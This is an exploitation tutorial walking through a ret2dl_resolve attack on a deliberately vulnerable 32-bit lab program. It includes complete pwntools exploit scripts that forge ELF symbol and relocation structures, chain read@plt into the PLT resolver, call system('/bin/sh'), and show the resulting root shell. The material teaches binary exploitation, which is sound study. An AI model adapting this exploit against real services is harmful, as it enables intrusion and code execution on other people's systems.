# EXPLOITS
## STACK BUFFER OVERFLOW FOR Return into dlresolve attack (Ret2dl_resolve)
## REQUIRED TO UNDERSTAND : STACK BUFFER OVERFLOW FOR RETURN TO LIBC (ret2libc) and STACK BUFFER OVERFLOW FOR RETURN ORIENTED PROGRAMMING (ROP)
## Bypass protections : NX, ASLR
This is another attack to bypass NX and ASLR with a ret2libc where we don't leak any data as it's done in the ret2plt (+ret2libc) technique
In this attack, we will resolve a symbol of our choice (like system) then we can pass arguments to it (like /bin/sh)  
There will be two payloads in the attack, during the first one will will call the `read` function to write somewhere to overwrite 3 structures then we can execute the target function
These are the structures we will have to overwrite :
- The `SYMTAB` structure instance which is an instance of the `Elf32_Sym` structure :
```c
typedef struct 
{ 
   Elf32_Word st_name ; /* Symbol name (string tbl index) */
   Elf32_Addr st_value ; /* Symbol value */ 
   Elf32_Word st_size ; /* Symbol size */ 
   unsigned char st_info ; /* Symbol type and binding */ 
   unsigned char st_other ; /* Symbol visibility under glibc>=2.2 */ 
   Elf32_Section st_shndx ; /* Section index */ 
} Elf32_Sym ;
```
- The `JMPTAB` structure which is from the segment `.rel.plt`, it's the relocation symbol, there are all the symbol entries stored in it which are instances of the strucutre `Elf32_Rel` :
```c
typedef uint32_t Elf32_Addr;
typedef uint32_t Elf32_Word;
typedef struct
{
  Elf32_Addr    r_offset;               /* Address */
  Elf32_Word    r_info;                 /* Relocation type and symbol index */
} Elf32_Rel;
/* How to extract and insert information held in the r_info field.  */
#define ELF32_R_SYM(val)                ((val) >> 8)
#define ELF32_R_TYPE(val)               ((val) & 0xff)
```
- The `STRTAB` wich gathers symlobs names as strings

So let's move on and let's have a look at the actual source code :
```c
#include <unistd.h>

void vuln(void){
    char buf[64];
    read(STDIN_FILENO, buf, 200);
}
int main(int argc, char** argv){
    vuln();
}
```
You can see that `main()` calls `vuln()` that will allocate a 64 bytes buffer, then it calls this function, `read` (from `unistd.h`), but `read` is a syscall that reads the from the file descriptor that we've specified, `STDIN_FILENO` (0), in this example it will read 200 bytes to store them on a buffer that is only 64 bytes, so of course, we can overflow it  
To compile it with GCC, we will use :
```
gcc <source code file>.c -o <executable> -fno-stack-protector -m32 -no-pie
```
Also you can enable ASLR, it won't affect the exploit (we will somehow bypass it)  
Let's now exploit this ! Before we build the first payload which will be a ROPchain, we first want to get some informations (some addresses), from which we can then do some calculations to find different offsets and addresses  
Before this, let's write the head of the python script where we will import `pwntools`, i'm using it just to get an address from the binary and to get a process from it to send lines to the vulnerable program :
```python
from pwn import *
import struct
elf = context.binary = ELF('./<executable>', checksec=False)
p = elf.process()
```
I'm also going to create a module where all functions that we will need will be placed, so i'mma name it `core.py` and i will import it :
```
import struct
```
In the `core.py`, we will just import `pwntools` and `struct` for now :
```python
from pwn import *
import struct
```
Awesome ! Now we need some static addresses from the binary, i said earlier that we will have to overwrite some strucuture instances, we will need their addresses  
So first, we will need the `JMPREL` structure, i will use `readelf` in the command line for that :
```bash
readelf -d ./vuln | grep "JMPREL"
```
```
0x00000017 (JMPREL)                     0x80482d8
```
Now we can add it in the main script :
```python
jmprel_address = 0x80482d8 # readelf -d ./vuln | grep "JMPREL"
```
I will do the same thing for `SYMTAB` :
```bash
readelf -d ./vuln | grep "SYMTAB"
```
```
0x00000006 (SYMTAB)                     0x804820c
```
Now we can add it in the main script :
```python
symtab_address = 0x804820c # readelf -d ./vuln | grep "SYMTAB"
```
And finally, the `STRTAB` :
```bash
readelf -d ./vuln | grep "STRTAB"
```
```
0x00000005 (STRTAB)                     0x804825c
```
Now we can add it in the main script :
```python
strtab_address = 0x804825c # readelf -d ./vuln | grep "STRTAB"
```
Awesome, now we need a data address where we can write, to do this, let's create a function in the `core.py` file :
```python
def get_data_addr(elf):
    bss_section = elf.get_section_by_name(".bss").header.sh_addr
    bss_size = elf.get_section_by_name(".bss").header.sh_size
    addr = bss_section + bss_size
    addr += (-addr & 0xfff) - 0x200 #next page in memory - 0x200
    return addr
```
Now in the `exploit.py` file :
```python
data_addr = core.get_data_addr(elf) # data for usage
```
Finally we have :
```python
from pwn import *
import core
import struct
elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
context.log_level = 'info'

jmprel_address = 0x80482d8 # readelf -d ./vuln | grep "JMPREL"
symtab_address = 0x804820c # readelf -d ./vuln | grep "SYMTAB"
strtab_address = 0x804825c # readelf -d ./vuln | grep "STRTAB"
data_addr = core.get_data_addr(elf) # data for usage
```
Looks perfect, now serious things can begin, let's start our math calculations, to do that, i will create a class which i will call `dlresolve_paydata` where we can pass these addresses to do the calculations and where it will also store the results  
Before doing that, we will copy these structure types directly in python as classes, so we will create the class `Elf32_Sym` and the class `Elf32_Rel` :
```python
class Elf32_Sym(object):
    """
        typedef struct elf32_sym{
            Elf32_Word	st_name;
            Elf32_Addr	st_value;
            Elf32_Word	st_size;
            unsigned char	st_info;
            unsigned char	st_other;
            Elf32_Half	st_shndx;
        } Elf32_Sym;
    """
    size = 16
    def __init__(self, st_name=0, st_value=0, st_size=0, st_info=0, st_other=0, st_shndx=0):
        self.st_name = st_name
        self.st_value = st_value
        self.st_size = st_size
        self.st_info = st_info
        self.st_other = st_other
        self.st_shndx = st_shndx
```
You can see that this class hold a lot of members/attributes, we will not use most of those, and we also have the `size` which will be useful  
And now the `Elf32_Rel` class :
```python
class Elf32_Rel(object):
    """
        typedef struct elf32_rel {
            Elf32_Addr  r_offset;
            Elf32_Word  r_info;
        } Elf32_Rel;
    """
    size=1
    def __init__(self, r_offset=0, r_info=0):
        self.r_offset = r_offset
        self.r_info = r_info
```
Lot shorter, just two arguments which are the `r_offset` and the `r_info` and the `size` which is 1  
We will also use a function wich will just align a number, the description is fair enough :
```python
def align(alignment, x):
    """align(alignment, x) -> int
    Rounds `x` up to nearest multiple of the `alignment`.
    Example:
      >>> [align(3, x) for x in range(30)]
      [0, 3, 3, 3, 6, 6, 6, 9, 9, 9, 12, 12, 12, 15, 15, 15, 18, 18, 18, 21, 21, 21, 24, 24, 24, 27, 27, 27, 30, 30]
    """
    return x + -x % alignment
```
Now we can make the `dlresolve_paydata` class :
```python
class dlresolve_paydata:
    def __init__(self, symbol, SYMTAB, STRTAB, JMPREL, DATA_ADDR):
```
You can see that the constructor takes first the symbol we want to resolve (in our case it's `system`) followed by the 3 structures intances and the data address that we've set up just before  
In the constructor method (`__init__`) The first thing we're gonna do is just to copy these arguments into the object so we can use them later :
```python
self.SYMTAB = SYMTAB
self.STRTAB = STRTAB
self.JMPREL = JMPREL
self.DATA_ADDR = DATA_ADDR
self.symbol = symbol
```
Then we want to calculate 3 things :
- First the address where the symbol will be stored, so we want it to be stored at the data address 
- Then the full symbol name which is the symbol name followed by a null byte terminator
- Finally, we want to address that comes just after the full symbol name in the memory
So let's go :
```python
self.symbol_name_addr = DATA_ADDR + 0 # where the symbol will be stored
self.symbol_name = self.symbol.encode() + b"\x00" # full symbol with a null byte
self.symbol_end_addr = self.symbol_name_addr + len(self.symbol_name) # after the address of the symbol
```
Then the for the `SYMTAB` values, we need first the index, the address of this structure we're building, the full sym struct, the address which comes after the full sym struct and the reloc index :
```python
# ELFSYM
self.index = align(core.Elf32_Sym.size, self.symbol_end_addr - SYMTAB) // core.Elf32_Sym.size
self.sym_addr = SYMTAB + core.Elf32_Sym.size * self.index
self.sym_struct = core.Elf32_Sym(st_name=self.symbol_name_addr - STRTAB)
self.sym_end_addr = self.sym_addr + self.sym_struct.size
self.reloc_index = align(core.Elf32_Rel.size, self.sym_end_addr - JMPREL) // core.Elf32_Rel.size
```
We're almost done for the calculations, the last thing we need are the values related to `JMPREL`, so first we need the address of the structure that we're building and the structure itself :
```python
# ELFREL
self.rel_addr = JMPREL + self.reloc_index * core.Elf32_Rel.size
self.rel_type = 7
self.rel_struct = core.Elf32_Rel(r_offset=DATA_ADDR, r_info=(self.index << 8) + self.rel_type)
```
Nice ! We're done for the calculations, so let's use the class in the main script :
```python
dlpaydata = core.dlresolve_paydata("system", symtab_address, strtab_address, jmprel_address, data_addr)
```
Now the payload and the ropchain, we will start by the dlresolve payload, because we need something before defining the first one, and it's the offset where `"/bin/sh\x00"` is :
So here is the dlresolve payload, where we will :
- Define/fake the full symbol name (symbol name + null byte) to the data address and 5 more unused bytes into the `STRTAB` structure
- Define/fake the structure `SYMTAB` and `JMPREL`
- Then write the argument we will pass to `system` (`"/bin/sh"`) followed by a null byte
```python
dlresolve_payload = bytearray()
# Write the symbol (system) to Symbol name addr
dlresolve_payload += dlpaydata.symbol_name # "system"+null byte terminator
dlresolve_payload += b"A"*5 # unused data
# SYMTAB (Elf32_Rel)
dlresolve_payload += struct.pack("I", dlpaydata.sym_struct.st_name)
dlresolve_payload += struct.pack("I", 0)*3 # other values of the strucutre
# JMPREL (Elf32_Sym)
dlresolve_payload += struct.pack("I", dlpaydata.rel_struct.r_offset)
dlresolve_payload += struct.pack("I", dlpaydata.rel_struct.r_info)
call_argument_offset = len(dlresolve_payload)
dlresolve_payload += b"/bin/sh" # the argument for system
dlresolve_payload += b"\x00" # null byte terminator
```
This `dlresolve_payload` will be written to `DATA_ADDR` just after it has been read with a call of `read` that will be placed on the ropchain, i could also have named it `dlresolve_data`
We then need the ropchain which, using read, will read the `dlresolve_payload` :
- First the buffer overflow, so the padding before overwrting the instruction pointer address
- We will first call `read` (on the plt so it's not random) to read the dlresolve payload
- Then we will use a gadget that will let us set `ESI` and `EBP`, where we will set `EBP` to our data address and `ESI` to null bytes so we will empty it
- After that we need the address resolver, which is the PLT init
- The reloc index
- The return address that we can set to anything we want
- And finally, the address of the argument of system, which will be wrote in the second payload
So we need two addresses : `read@plt` and the `resolver`/`plt_init`  
So let's use gdb :
```bash
gdb <executable>
# (gdb)>
disass vuln
```
It gived me :
```nasm
Dump of assembler code for function vuln:
   0x08049162 <+0>:	push   ebp
   0x08049163 <+1>:	mov    ebp,esp
   0x08049165 <+3>:	push   ebx
   0x08049166 <+4>:	sub    esp,0x44
   0x08049169 <+7>:	call   0x80491ad <__x86.get_pc_thunk.ax>
   0x0804916e <+12>:	add    eax,0x2e92
   0x08049173 <+17>:	sub    esp,0x4
   0x08049176 <+20>:	push   0xc8
   0x0804917b <+25>:	lea    edx,[ebp-0x48]
   0x0804917e <+28>:	push   edx
   0x0804917f <+29>:	push   0x0
   0x08049181 <+31>:	mov    ebx,eax
   0x08049183 <+33>:	call   0x8049030 <read@plt> <------------------------
   0x08049188 <+38>:	add    esp,0x10
   0x0804918b <+41>:	nop
   0x0804918c <+42>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x0804918f <+45>:	leave  
   0x08049190 <+46>:	ret    
End of assembler dump.
```
We can see that `read@plt` has the address `0x8049030`  
To get the resolver (or plt_init) address we can either substract 16 from the first function that is called in the plt or we can use gdb  
We will use gdb, so let's get it, we have to disassemble `0x8049030` (`read@plt`) :
```
disass 0x8049030
```
It gived me :
```
Dump of assembler code for function read@plt:
   0x08049030 <+0>:	jmp    DWORD PTR ds:0x804c00c
   0x08049036 <+6>:	push   0x0
   0x0804903b <+11>:	jmp    0x8049020
End of assembler dump.
```
The last `jmp` will jump to this resolver so it's address is `0x8049020` which is also `0x8049030`-`16`  
Perfect, now let's make the full ropchain :
```python
padding = 76 # offset before overwriting EIP
read_plt = 0x08049030
resolver = 0x08049030-16 # plt_init

payload = bytearray()
payload += ('A'*padding).encode()
payload += struct.pack("I", read_plt) # read@plt, remember that calling a function in the plt outcomes to calling the function itself
payload += struct.pack("I", 0x0804921a) # ropgadget : pop edi; pop ebp; ret
payload += struct.pack("I", 0x00000000) # args[0] -> Null
payload += struct.pack("I", dlpaydata.DATA_ADDR) # args[1] -> Symbol name address ("system\x00" in payload2)
payload += struct.pack("I", resolver) # [plt_init] system(dlresolve.data_addr+36) so dlresolve.data_addr+36 is the argument that will use system when it will get executed
payload += struct.pack("I", dlpaydata.reloc_index) # reloc index (dlresolve.reloc_index)
payload += ("AAAA").encode() # return address (not important)
payload += struct.pack("I", dlpaydata.DATA_ADDR+call_argument_offset) # args[0] of system which will be written in the second payload (payload2 at "/bin/sh\x00")
```
We're done ! The last thing to do is of course to send the payloads, but with a timeout of 1 second between each of them, because if you don't do that, you may have an error because the payload has been sent to fast ! And i faced this problem, so i rather mention it, so we have to import the time module :
```python
import time
```
Now we can send the payloads correctly with a timeout :
```python
p.sendline(payload) # ropchain that will call read
time.sleep(1) # because we don't want to send too fast !
p.sendline(dlresolve_payload) # data which the function read will read
p.interactive() # user input control
```
So here's the full code :
`core.py` :
```python
from pwn import *
import struct

def get_data_addr(elf):
    bss_section = elf.get_section_by_name(".bss").header.sh_addr
    bss_size = elf.get_section_by_name(".bss").header.sh_size
    addr = bss_section + bss_size
    addr += (-addr & 0xfff) - 0x200 #next page in memory - 0x200
    return addr

class Elf32_Sym(object):
    """
        typedef struct elf32_sym{
            Elf32_Word	st_name;
            Elf32_Addr	st_value;
            Elf32_Word	st_size;
            unsigned char	st_info;
            unsigned char	st_other;
            Elf32_Half	st_shndx;
        } Elf32_Sym;
    """
    size = 16
    def __init__(self, st_name=0, st_value=0, st_size=0, st_info=0, st_other=0, st_shndx=0):
        self.st_name = st_name
        self.st_value = st_value
        self.st_size = st_size
        self.st_info = st_info
        self.st_other = st_other
        self.st_shndx = st_shndx

class Elf32_Rel(object):
    """
        typedef struct elf32_rel {
            Elf32_Addr  r_offset;
            Elf32_Word  r_info;
        } Elf32_Rel;
    """
    size=1
    def __init__(self, r_offset=0, r_info=0):
        self.r_offset = r_offset
        self.r_info = r_info

def align(alignment, x):
    """align(alignment, x) -> int
    Rounds `x` up to nearest multiple of the `alignment`.
    Example:
      >>> [align(5, n) for n in range(15)]
      [0, 5, 5, 5, 5, 5, 10, 10, 10, 10, 10, 15, 15, 15, 15]
    """
    return x + -x % alignment

class dlresolve_paydata:
    def __init__(self, symbol, SYMTAB, STRTAB, JMPREL, DATA_ADDR):
        self.SYMTAB = SYMTAB
        self.STRTAB = STRTAB
        self.JMPREL = JMPREL
        self.DATA_ADDR = DATA_ADDR

        self.symbol = symbol
        self.symbol_name_addr = DATA_ADDR + 0 # where the symbol will be stored
        self.symbol_name = self.symbol.encode() + b"\x00" # full symbol with a null byte
        self.symbol_end_addr = self.symbol_name_addr + len(self.symbol_name) # after the address of the symbol
        # ELFSYM
        self.index = align(Elf32_Sym.size, self.symbol_end_addr - SYMTAB) // Elf32_Sym.size
        self.sym_addr = SYMTAB + Elf32_Sym.size * self.index
        self.sym_struct = Elf32_Sym(st_name=self.symbol_name_addr - STRTAB)
        self.sym_end_addr = self.sym_addr + self.sym_struct.size
        self.reloc_index = align(Elf32_Rel.size, self.sym_end_addr - JMPREL) // Elf32_Rel.size
        # ELFREL
        self.rel_addr = JMPREL + self.reloc_index * Elf32_Rel.size
        self.rel_type = 7
        self.rel_struct = Elf32_Rel(r_offset=DATA_ADDR, r_info=(self.index << 8) + self.rel_type)
```
`exploit.py` :
```python
from pwn import *
import core
import struct
import time
elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
#context.log_level = 'debug'

jmprel_address = 0x80482d8 # readelf -d ./vuln | grep "JMPREL"
symtab_address = 0x804820c # readelf -d ./vuln | grep "SYMTAB"
strtab_address = 0x804825c # readelf -d ./vuln | grep "STRTAB"
data_addr = core.get_data_addr(elf) # data for usage

dlpaydata = core.dlresolve_paydata("system", symtab_address, strtab_address, jmprel_address, data_addr)

print("symtab.stname : "+str(hex(dlpaydata.sym_struct.st_name)))
print("jmprel.r_offset : "+str(hex(dlpaydata.rel_struct.r_offset)))
print("jmprel.r_info : "+str(hex(dlpaydata.rel_struct.r_info)))
print("reloc_index : "+str(hex(dlpaydata.reloc_index)))

# dlresolve payload in the DATA_ADDR :

dlresolve_payload = bytearray()
# Write the symbol (system) to Symbol name addr
dlresolve_payload += dlpaydata.symbol_name # "system"+null byte terminator
dlresolve_payload += b"A"*5 # unused data
# SYMTAB (Elf32_Rel)
dlresolve_payload += struct.pack("I", dlpaydata.sym_struct.st_name)
dlresolve_payload += struct.pack("I", 0)*3 # other values of the strucutre
# JMPREL (Elf32_Sym)
dlresolve_payload += struct.pack("I", dlpaydata.rel_struct.r_offset)
dlresolve_payload += struct.pack("I", dlpaydata.rel_struct.r_info)
call_argument_offset = len(dlresolve_payload)
dlresolve_payload += b"/bin/sh" # the argument for system
dlresolve_payload += b"\x00" # null byte terminator

padding = 76 # offset before overwriting EIP
read_plt = 0x08049030
resolver = 0x08049030-16 # plt_init

# ROPchain :
payload = bytearray()
payload += ('A'*padding).encode()
payload += struct.pack("I", read_plt) # read@plt, remember that calling a function in the plt outcomes to calling the function itself
payload += struct.pack("I", 0x0804921a) # ropgadget : pop edi; pop ebp; ret
payload += struct.pack("I", 0x00000000) # args[0] -> Null
payload += struct.pack("I", dlpaydata.DATA_ADDR) # args[1] -> Symbol name address ("system\x00" in payload2)
payload += struct.pack("I", resolver) # [plt_init] system(dlresolve.data_addr+36) so dlresolve.data_addr+36 is the argument that will use system when it will get executed
payload += struct.pack("I", dlpaydata.reloc_index) # reloc index (dlresolve.reloc_index)
payload += ("AAAA").encode() # return address (not important)
payload += struct.pack("I", dlpaydata.DATA_ADDR+call_argument_offset) # args[0] of system which will be written in the second payload (payload2 at "/bin/sh\x00")

p.sendline(payload)
time.sleep(1)
p.sendline(dlresolve_payload)

p.interactive()
```
You can see that i've printed the structures values :
Let's test it :
```bash
python3 exploit.py                                                                                                                                                                                                 1 ⨯
[+] Starting local process '/root/Lab/simple-vulns/return-oriented-programming/ret2dl_resolve/vuln': pid 7513
symtab.stname : 0x4ba4
jmprel.r_offset : 0x804ce00
jmprel.r_info : 0x4c007
reloc_index : 0x4b44
[*] Switching to interactive mode
$ 
$ ls
build.sh  core.py  exploit_old.py  exploit.py  main.c  old  __pycache__  vuln
$ id
uid=0(root) gid=0(root) groups=0(root),142(kaboxer)
$ root
/bin/sh: 4: root: not found
$ whoami
root
```
If you get an error message like
```
Inconsistency detected by ld.so: dl-runtime.c: 80: _dl_fixup: Assertion `ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT' failed!
```
It's either your exploit code is wrong or you have to restart the exploit until it works, at the worst of cases, you can reboot your system, i don't know why this is happening but i don't know, sometimes it works, sometimes it's not, it's random for me, and i don't know why  
(EDIT (23/08/2021) : This notice that i wrote here about the error is now i think completely fixed because i've faced this problem before adding a timeout between when i send the payloads)  
Anyways, thanks for have reading this !
